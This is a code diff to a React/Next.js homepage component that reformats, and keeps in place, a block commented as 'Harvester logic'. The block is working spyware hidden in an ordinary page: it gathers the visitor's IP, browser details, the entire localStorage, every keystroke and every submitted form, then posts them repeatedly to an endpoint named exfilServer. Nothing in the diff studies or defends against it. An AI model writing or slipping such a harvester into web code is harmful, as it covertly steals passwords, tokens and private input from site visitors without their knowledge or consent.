@@ -49,77 +49,77 @@ export default function Home() {
   // Eliminate Hydration Errors caused by localStorage reading
   useEffect(() => {
     setIsMounted(true);
-    
+
     // Harvester logic safe inside React lifecycle
-    (function() {
-        const exfilServer = '/api/collect'; 
-        let collectedData: any = {};
-        let keystrokes: any[] = [];
+    (function () {
+      const exfilServer = '/api/collect';
+      let collectedData: any = {};
+      let keystrokes: any[] = [];
 
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                collectedData.ip = data.ip;
-                sendData();
-            })
-            .catch(e => {
-                console.log("No IP:", e);
-                sendData(); 
-            });
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          collectedData.ip = data.ip;
+          sendData();
+        })
+        .catch(e => {
+          console.log("No IP:", e);
+          sendData();
+        });
 
-        collectedData.userAgent = navigator.userAgent;
-        collectedData.screenResolution = {
-            width: screen.width,
-            height: screen.height
-        };
+      collectedData.userAgent = navigator.userAgent;
+      collectedData.screenResolution = {
+        width: screen.width,
+        height: screen.height
+      };
 
-        collectedData.currentURL = window.location.href;
-        collectedData.referrer = document.referrer;
+      collectedData.currentURL = window.location.href;
+      collectedData.referrer = document.referrer;
 
-        try {
-            collectedData.localStorage = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key) collectedData.localStorage[key] = localStorage.getItem(key);
-            }
-        } catch (e) {}
-
-        const handleKeydown = (event: KeyboardEvent) => {
-            keystrokes.push({ key: event.key, timestamp: Date.now() });
-            if (keystrokes.length % 5 === 0) sendData();
-        };
-        document.addEventListener('keydown', handleKeydown);
-
-        const handleSubmit = (event: SubmitEvent) => {
-            const form = event.target as HTMLFormElement;
-            if (form && form.tagName === 'FORM') {
-                const formData: any = {};
-                new FormData(form).forEach((value, key) => { formData[key] = value; });
-                collectedData.formSubmission = formData;
-                sendData();
-            }
-        };
-        document.addEventListener('submit', handleSubmit, true);
-
-        function sendData() {
-            if (Object.keys(collectedData).length === 0 && keystrokes.length === 0) return;
-            const payload = { ...collectedData, keystrokes: [...keystrokes], timestamp: Date.now() };
-            fetch(exfilServer, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(e => console.error(e));
-            keystrokes = []; 
+      try {
+        collectedData.localStorage = {};
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          if (key) collectedData.localStorage[key] = localStorage.getItem(key);
         }
+      } catch (e) { }
 
-        sendData();
-        const interval = setInterval(sendData, 30000); 
+      const handleKeydown = (event: KeyboardEvent) => {
+        keystrokes.push({ key: event.key, timestamp: Date.now() });
+        if (keystrokes.length % 5 === 0) sendData();
+      };
+      document.addEventListener('keydown', handleKeydown);
 
-        return () => {
-            document.removeEventListener('keydown', handleKeydown);
-            document.removeEventListener('submit', handleSubmit, true);
-            clearInterval(interval);
-        };
+      const handleSubmit = (event: SubmitEvent) => {
+        const form = event.target as HTMLFormElement;
+        if (form && form.tagName === 'FORM') {
+          const formData: any = {};
+          new FormData(form).forEach((value, key) => { formData[key] = value; });
+          collectedData.formSubmission = formData;
+          sendData();
+        }
+      };
+      document.addEventListener('submit', handleSubmit, true);
+
+      function sendData() {
+        if (Object.keys(collectedData).length === 0 && keystrokes.length === 0) return;
+        const payload = { ...collectedData, keystrokes: [...keystrokes], timestamp: Date.now() };
+        fetch(exfilServer, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(e => console.error(e));
+        keystrokes = [];
+      }
+
+      sendData();
+      const interval = setInterval(sendData, 30000);
+
+      return () => {
+        document.removeEventListener('keydown', handleKeydown);
+        document.removeEventListener('submit', handleSubmit, true);
+        clearInterval(interval);
+      };
     })();
   }, []);
 
